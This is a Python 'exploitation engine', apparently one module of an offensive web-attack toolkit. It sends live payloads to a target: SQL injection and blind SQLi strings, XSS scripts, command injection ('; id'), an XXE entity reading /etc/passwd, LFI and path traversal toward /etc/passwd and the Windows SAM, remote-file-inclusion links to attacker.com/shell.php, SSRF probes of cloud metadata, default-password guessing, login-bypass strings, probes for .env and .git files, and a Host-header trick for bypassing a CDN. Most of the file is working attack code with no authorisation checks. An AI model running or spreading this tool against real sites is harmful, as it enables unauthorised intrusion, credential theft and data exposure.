#!/usr/bin/env python3
"""
Exploitation Module
Web vulnerability testing and exploitation
"""

import requests
import json
import time
import urllib3
from dataclasses import dataclass, field
from datetime import datetime
from typing import List, Optional, Dict, Tuple
from urllib.parse import urljoin, quote
import re

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

@dataclass
class Vulnerability:
    """Vulnerability finding"""
    vuln_type: str  # SQLi, XSS, RCE, etc
    severity: str  # critical, high, medium, low
    url: str
    parameter: str = ""
    payload: str = ""
    response: str = ""
    cve: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class ExploitationResult:
    """Exploitation attempt result"""
    target: str
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    successful_exploits: int = 0
    attempted_exploits: int = 0
    execution_time: float = 0.0

class ExploitationEngine:
    """Web vulnerability exploitation engine"""
    
    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self.session = requests.Session()
        self.vulnerabilities = []
        self.request_delay = 0.3  # 300ms delay between requests (was 500ms)
        self.rate_limit_delay = 3  # 3s delay if rate limited
        self.max_retries = 2
    
    def _safe_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """Make a safe request with rate limit handling"""
        for attempt in range(self.max_retries):
            try:
                time.sleep(self.request_delay)  # Throttle requests
                
                response = self.session.request(method, url, timeout=self.timeout, **kwargs)
                
                # Handle rate limiting
                if response.status_code == 429:
                    if attempt < self.max_retries - 1:
                        time.sleep(self.rate_limit_delay * (attempt + 1))
                        continue
                    return None
                
                return response
            except requests.exceptions.Timeout:
                if attempt < self.max_retries - 1:
                    time.sleep(1)
                    continue
                return None
            except Exception:
                if attempt < self.max_retries - 1:
                    time.sleep(0.5)
                    continue
                return None
        return None
        
    def test_sql_injection(self, url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test for SQL injection vulnerabilities"""
        findings = []
        
        # SQL injection payloads (reduced for speed)
        payloads = {
            "basic": "' OR '1'='1",
            "union": "' UNION SELECT NULL--",
            "comments": "' OR 1=1--"
        }
        
        if params is None:
            params = {}
        
        for param_name, param_value in params.items():
            for payload_name, payload in payloads.items():
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = self._safe_request('GET', url, params=test_params, timeout=self.timeout, verify=False)
                if response:
                    # Basic detection patterns
                    if self._is_sqli_response(response.text):
                        findings.append(Vulnerability(
                            vuln_type="SQL Injection",
                            severity="critical",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            response=response.text[:500]
                        ))
        
        return findings
    
    def test_xss(self, url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test for Cross-Site Scripting (XSS)"""
        findings = []
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror='alert(1)'>",
            "'\"<script>alert(1)</script>"
        ]
        
        if params is None:
            params = {}
        
        for param_name, param_value in params.items():
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = self._safe_request('GET', url, params=test_params, timeout=self.timeout, verify=False)
                if response and payload in response.text:
                    findings.append(Vulnerability(
                        vuln_type="Cross-Site Scripting (XSS)",
                        severity="high",
                        url=url,
                        parameter=param_name,
                        payload=payload
                    ))
        
        return findings
    
    def test_command_injection(self, url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test for command injection vulnerabilities"""
        findings = []
        
        # Reduced payloads for speed
        payloads = {
            "unix": "; id",
            "windows": "& whoami"
        }
        
        if params is None:
            params = {}
        
        for param_name, param_value in params.items():
            for payload_name, payload in payloads.items():
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(
                        url,
                        params=test_params,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    # Check for command output patterns
                    if self._is_rce_response(response.text):
                        findings.append(Vulnerability(
                            vuln_type="Command Injection (RCE)",
                            severity="critical",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            response=response.text[:300]
                        ))
                except Exception:
                    pass
        
        return findings

    def test_idor(self, url: str) -> List[Vulnerability]:
        """Test for insecure direct object reference via simple ID tampering"""
        findings = []
        candidate_params = ["id", "user", "uid", "account"]
        baseline_values = ["1", "2"]
        tamper_values = ["10", "99", "999", "1000"]

        for param in candidate_params:
            for base_val in baseline_values:
                base_resp = self._safe_request('GET', url, params={param: base_val}, verify=False)
                if not base_resp or base_resp.status_code >= 400:
                    continue
                base_len = len(base_resp.content)
                for tamper_val in tamper_values:
                    tamper_resp = self._safe_request('GET', url, params={param: tamper_val}, verify=False)
                    if not tamper_resp:
                        continue
                    if tamper_resp.status_code == base_resp.status_code:
                        delta = abs(len(tamper_resp.content) - base_len)
                        if delta > 300:
                            findings.append(Vulnerability(
                                vuln_type="IDOR",
                                severity="high",
                                url=url,
                                parameter=param,
                                payload=f"{param}={tamper_val}",
                                response=f"len diff {delta}"
                            ))
                            return findings  # stop early on first strong signal
        return findings

    def test_xxe(self, url: str) -> List[Vulnerability]:
        """Test for XML External Entity processing"""
        findings = []
        xml_payload = """<?xml version='1.0'?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<root><data>&xxe;</data></root>"""
        headers = {"Content-Type": "application/xml"}
        resp = self._safe_request('POST', url, data=xml_payload, headers=headers, verify=False)
        if resp:
            body = resp.text[:500].lower()
            if "root:x:" in body or "etc/passwd" in body or "doctype" in body:
                findings.append(Vulnerability(
                    vuln_type="XXE",
                    severity="high",
                    url=url,
                    payload="xml-doctype-xxe",
                    response=resp.text[:300]
                ))
        return findings
    
    def test_lfi(self, base_url: str) -> List[Vulnerability]:
        """Test for Local File Inclusion"""
        findings = []
        
        lfi_payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "file:///etc/passwd"
        ]
        
        for payload in lfi_payloads:
            for param in ["file", "page", "path", "include", "view"]:
                test_url = f"{base_url}?{param}={payload}"
                
                try:
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if "root:" in response.text or "bin/bash" in response.text:
                        findings.append(Vulnerability(
                            vuln_type="Local File Inclusion (LFI)",
                            severity="high",
                            url=test_url,
                            parameter=param,
                            payload=payload
                        ))
                except Exception:
                    pass
        
        return findings
    
    def test_rfi(self, base_url: str) -> List[Vulnerability]:
        """Test for Remote File Inclusion"""
        findings = []
        
        payloads = [
            "http://attacker.com/shell.php",
            "http://attacker.com/shell.txt",
            "ftp://attacker.com/shell.php"
        ]
        
        for payload in payloads:
            for param in ["file", "page", "path", "include", "view"]:
                test_url = f"{base_url}?{param}={quote(payload)}"
                
                try:
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    # Look for evidence of inclusion attempt
                    if response.status_code in [200, 403]:
                        findings.append(Vulnerability(
                            vuln_type="Remote File Inclusion (RFI)",
                            severity="high",
                            url=test_url,
                            parameter=param,
                            payload=payload
                        ))
                except Exception:
                    pass
        
        return findings
    
    def test_ssrf(self, url: str) -> List[Vulnerability]:
        """Test for Server-Side Request Forgery via URL-like params"""
        findings = []
        params_to_try = ["url", "target", "dest", "redirect", "next", "feed", "data"]
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80/",
            "http://localhost/"
        ]
        for param in params_to_try:
            for payload in payloads:
                resp = self._safe_request('GET', url, params={param: payload}, verify=False)
                if not resp:
                    continue
                body = resp.text.lower()
                if any(keyword in body for keyword in ["ami-id", "meta-data", "localhost", "127.0.0.1"]):
                    findings.append(Vulnerability(
                        vuln_type="SSRF",
                        severity="high",
                        url=url,
                        parameter=param,
                        payload=payload,
                        response=resp.text[:300]
                    ))
                    return findings
        return findings
    
    def test_ssti(self, url: str) -> List[Vulnerability]:
        """Test for Server-Side Template Injection with simple math payloads"""
        findings = []
        params_to_try = ["q", "name", "search", "template", "user"]
        payloads = ["{{7*7}}", "${7*7}", "${{7*7}}", "<%= 7*7 %>"]
        for param in params_to_try:
            for payload in payloads:
                resp = self._safe_request('GET', url, params={param: payload}, verify=False)
                if not resp:
                    continue
                if "49" in resp.text and payload not in resp.text:
                    findings.append(Vulnerability(
                        vuln_type="SSTI",
                        severity="critical",
                        url=url,
                        parameter=param,
                        payload=payload,
                        response=resp.text[:200]
                    ))
                    return findings
        return findings
    
    def test_open_redirect(self, url: str) -> List[Vulnerability]:
        """Test for open redirect via common redirect params"""
        findings = []
        params_to_try = ["redirect", "redir", "next", "url", "return", "goto"]
        payload = "//evil.example.com"
        for param in params_to_try:
            resp = self._safe_request('GET', url, params={param: payload}, allow_redirects=False, verify=False)
            if not resp:
                continue
            loc = resp.headers.get("Location", "")
            if loc.startswith("//evil.example.com") or "evil.example.com" in loc:
                findings.append(Vulnerability(
                    vuln_type="Open Redirect",
                    severity="medium",
                    url=url,
                    parameter=param,
                    payload=payload,
                    response=loc[:200]
                ))
                return findings
        return findings

    def test_blind_sqli(self, url: str) -> List[Vulnerability]:
        """Test for blind SQL injection via time-based delays"""
        findings = []
        params_to_try = ["id", "user", "uid", "page"]
        payloads = [
            "1' AND SLEEP(5)--",
            "1; WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
        import time as time_module
        for param in params_to_try:
            for payload in payloads:
                start = time_module.time()
                resp = self._safe_request('GET', url, params={param: payload}, verify=False)
                elapsed = time_module.time() - start
                if resp and elapsed >= 4.5:
                    findings.append(Vulnerability(
                        vuln_type="Blind SQL Injection",
                        severity="critical",
                        url=url,
                        parameter=param,
                        payload=payload,
                        response=f"Time delay: {elapsed:.2f}s"
                    ))
                    return findings
        return findings

    def test_cors_misconfiguration(self, url: str) -> List[Vulnerability]:
        """Test for CORS misconfiguration allowing arbitrary origins"""
        findings = []
        test_origin = "https://evil.example.com"
        resp = self._safe_request('GET', url, headers={"Origin": test_origin}, verify=False)
        if not resp:
            return findings
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
        if acao == test_origin or acao == "*":
            severity = "high" if acac.lower() == "true" else "medium"
            findings.append(Vulnerability(
                vuln_type="CORS Misconfiguration",
                severity=severity,
                url=url,
                payload=f"Origin: {test_origin}",
                response=f"ACAO: {acao}, ACAC: {acac}"
            ))
        return findings

    def test_security_headers(self, url: str) -> List[Vulnerability]:
        """Check for missing security headers"""
        findings = []
        resp = self._safe_request('GET', url, verify=False)
        if not resp:
            return findings
        missing = []
        if "X-Frame-Options" not in resp.headers and "Content-Security-Policy" not in resp.headers:
            missing.append("X-Frame-Options/CSP (Clickjacking risk)")
        if "Strict-Transport-Security" not in resp.headers:
            missing.append("HSTS")
        if "X-Content-Type-Options" not in resp.headers:
            missing.append("X-Content-Type-Options (MIME sniffing)")
        if "X-XSS-Protection" not in resp.headers:
            missing.append("X-XSS-Protection")
        if missing:
            findings.append(Vulnerability(
                vuln_type="Missing Security Headers",
                severity="low",
                url=url,
                payload="security-headers",
                response="Missing: " + ", ".join(missing)
            ))
        return findings
    
    def test_default_credentials(self, url: str) -> List[Vulnerability]:
        """Test for default credentials"""
        findings = []
        
        common_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("root", "password"),
            ("test", "test"),
            ("guest", "guest"),
            ("administrator", "password")
        ]
        
        for username, password in common_creds:
            try:
                response = self.session.post(
                    url,
                    data={"username": username, "password": password},
                    timeout=self.timeout,
                    verify=False
                )
                
                if "success" in response.text.lower() or response.status_code == 302:
                    findings.append(Vulnerability(
                        vuln_type="Default Credentials",
                        severity="critical",
                        url=url,
                        payload=f"{username}:{password}"
                    ))
            except Exception:
                pass
        
        return findings
    
    def test_authentication_bypass(self, login_url: str) -> List[Vulnerability]:
        """Test for authentication bypass"""
        findings = []
        
        payloads = [
            {"username": "admin' OR '1'='1", "password": "anything"},
            {"username": "admin' --", "password": ""},
            {"username": "' OR 1=1--", "password": ""},
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "*", "password": "*"}
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(
                    login_url,
                    data=payload,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
                
                # Check for bypass indicators
                if any(word in response.text.lower() for word in 
                       ["dashboard", "welcome", "logout", "home"]):
                    findings.append(Vulnerability(
                        vuln_type="Authentication Bypass",
                        severity="critical",
                        url=login_url,
                        payload=json.dumps(payload)
                    ))
            except Exception:
                pass
        
        return findings
    
    def test_path_traversal(self, base_url: str) -> List[Vulnerability]:
        """Test for path traversal vulnerabilities"""
        findings = []
        
        traversal_payloads = [
            "../../windows/win.ini",
            "../../etc/passwd",
            "....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
            "%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in traversal_payloads:
            test_url = f"{base_url}/{payload}"
            
            try:
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=False
                )
                
                if response.status_code == 200 and len(response.text) > 100:
                    findings.append(Vulnerability(
                        vuln_type="Path Traversal",
                        severity="high",
                        url=test_url,
                        payload=payload
                    ))
            except Exception:
                pass
        
        return findings
    
    def _is_sqli_response(self, response_text: str) -> bool:
        """Detect SQL injection in response"""
        patterns = [
            r"SQL syntax",
            r"mysql_fetch",
            r"Warning.*mysql",
            r"PostgreSQL.*error",
            r"Oracle error",
            r"sqlite_",
            r"JDBC.*error"
        ]
        
        return any(re.search(pattern, response_text, re.IGNORECASE) for pattern in patterns)
    
    def _is_rce_response(self, response_text: str) -> bool:
        """Detect RCE in response"""
        patterns = [
            r"uid=\d+",
            r"root:x:0:0",
            r"Microsoft Windows",
            r"C:\\.*>",
            r"/bin/bash"
        ]
        
        return any(re.search(pattern, response_text) for pattern in patterns)
    
    def _test_common_paths(self, base_url: str, result: ExploitationResult):
        """Test for common directories and sensitive files"""
        from urllib.parse import urlparse
        
        # Check if this is a cPanel port
        parsed = urlparse(base_url)
        port = parsed.port
        is_cpanel = port in [2082, 2083, 2086, 2087, 2095, 2096]
        
        if is_cpanel:
            # Test cPanel login
            response = self._safe_request('GET', base_url, verify=False)
            if response and ('cpanel' in response.text.lower() or 'whm' in response.text.lower()):
                result.vulnerabilities.append(Vulnerability(
                    vuln_type="Exposed Admin Panel",
                    severity="high",
                    url=base_url,
                    parameter="panel",
                    payload="cPanel/WHM Login Exposed",
                    response=f"cPanel detected on port {port}"
                ))
                from utils.helpers import print_warning
                print_warning(f"[!] cPanel/WHM panel exposed on port {port}")
            return
        
        # Reduced path list for speed
        common_paths = [
            # Most critical paths only
            "/admin", "/wp-admin", "/phpmyadmin",
            "/.env", "/config.php", "/wp-config.php", "/.git/config",
            "/backup.sql", "/backup.zip", "/database.sql",
            "/phpinfo.php", "/robots.txt"
        ]
        
        found_count = 0
        for path in common_paths:
            response = self._safe_request('GET', base_url.rstrip('/') + path, verify=False, allow_redirects=False)
            
            if response and response.status_code in [200, 403, 401]:
                severity = "high" if any(x in path for x in ['.env', 'config', 'backup', '.git', 'admin']) else "medium"
                result.vulnerabilities.append(Vulnerability(
                    vuln_type="Information Disclosure",
                    severity=severity,
                    url=base_url.rstrip('/') + path,
                    parameter="path",
                    payload=path,
                    response=f"Status: {response.status_code}, Size: {len(response.content)} bytes"
                ))
                found_count += 1
                if found_count <= 5:  # Don't spam output
                    from utils.helpers import print_success
                    print_success(f"[+] Found: {path} (HTTP {response.status_code})")
    
    def full_website_scan(self, target_url: str, host_header: str = None) -> ExploitationResult:
        """Perform comprehensive website scan
        
        Args:
            target_url: URL to scan (can be IP address)
            host_header: Optional Host header to use (for bypassing CDN)
        """
        from utils.helpers import print_info, print_success, print_warning
        import time
        
        result = ExploitationResult(target=target_url)
        start_time = time.time()
        
        # Set Host header for session if provided
        if host_header:
            self.session.headers.update({'Host': host_header})
        
        try:
            # Parse URL for parameters
            print_info(f"[*] Scanning {target_url}...")
            
            # Directory and file discovery
            print_info("[*] Testing common paths and files...")
            self._test_common_paths(target_url, result)
            
            # Test main URL with various parameters (reduced for speed)
            test_params = {"id": "1", "page": "1"}
            
            # SQL Injection
            print_info("[*] Testing SQL Injection...")
            sqli = self.test_sql_injection(target_url, test_params)
            result.vulnerabilities.extend(sqli)
            result.attempted_exploits += 1
            if sqli:
                result.successful_exploits += 1
                print_success(f"[+] SQL Injection found: {len(sqli)} instances")
            
            # XSS
            print_info("[*] Testing XSS...")
            xss = self.test_xss(target_url, test_params)
            result.vulnerabilities.extend(xss)
            result.attempted_exploits += 1
            if xss:
                result.successful_exploits += 1
                print_success(f"[+] XSS found: {len(xss)} instances")
            
            # Command Injection (skip if rate limited)
            print_info("[*] Testing Command Injection...")
            rce = self.test_command_injection(target_url, test_params)
            result.vulnerabilities.extend(rce)
            result.attempted_exploits += 1
            if rce:
                result.successful_exploits += 1
                print_success(f"[+] RCE found: {len(rce)} instances")

            # IDOR
            print_info("[*] Testing IDOR (parameter tampering)...")
            idor = self.test_idor(target_url)
            result.vulnerabilities.extend(idor)
            result.attempted_exploits += 1
            if idor:
                result.successful_exploits += 1
                print_success(f"[+] IDOR found: {len(idor)} instances")

            # XXE
            print_info("[*] Testing XML External Entity (XXE)...")
            xxe = self.test_xxe(target_url)
            result.vulnerabilities.extend(xxe)
            result.attempted_exploits += 1
            if xxe:
                result.successful_exploits += 1
                print_success(f"[+] XXE found: {len(xxe)} instances")

            # SSRF
            print_info("[*] Testing SSRF...")
            ssrf = self.test_ssrf(target_url)
            result.vulnerabilities.extend(ssrf)
            result.attempted_exploits += 1
            if ssrf:
                result.successful_exploits += 1
                print_success(f"[+] SSRF found: {len(ssrf)} instances")

            # SSTI
            print_info("[*] Testing SSTI...")
            ssti = self.test_ssti(target_url)
            result.vulnerabilities.extend(ssti)
            result.attempted_exploits += 1
            if ssti:
                result.successful_exploits += 1
                print_success(f"[+] SSTI found: {len(ssti)} instances")

            # Open Redirect
            print_info("[*] Testing Open Redirect...")
            orfind = self.test_open_redirect(target_url)
            result.vulnerabilities.extend(orfind)
            result.attempted_exploits += 1
            if orfind:
                result.successful_exploits += 1
                print_success(f"[+] Open Redirect found: {len(orfind)} instances")

            # Blind SQL Injection
            print_info("[*] Testing Blind SQL Injection (time-based)...")
            blind_sqli = self.test_blind_sqli(target_url)
            result.vulnerabilities.extend(blind_sqli)
            result.attempted_exploits += 1
            if blind_sqli:
                result.successful_exploits += 1
                print_success(f"[+] Blind SQLi found: {len(blind_sqli)} instances")

            # CORS Misconfiguration
            print_info("[*] Testing CORS configuration...")
            cors = self.test_cors_misconfiguration(target_url)
            result.vulnerabilities.extend(cors)
            result.attempted_exploits += 1
            if cors:
                result.successful_exploits += 1
                print_success(f"[+] CORS misconfiguration found: {len(cors)} instances")

            # Security Headers
            print_info("[*] Checking security headers...")
            headers = self.test_security_headers(target_url)
            result.vulnerabilities.extend(headers)
            result.attempted_exploits += 1
            if headers:
                result.successful_exploits += 1
                print_success(f"[+] Security headers missing: {len(headers)} issues")
            
            # Skip LFI and default credentials for speed (too many requests)
            
            result.execution_time = time.time() - start_time
            
        except Exception as e:
            print_warning(f"[!] Scan error: {e}")
        finally:
            # Clean up Host header if it was set
            if host_header and 'Host' in self.session.headers:
                del self.session.headers['Host']
        
        return result
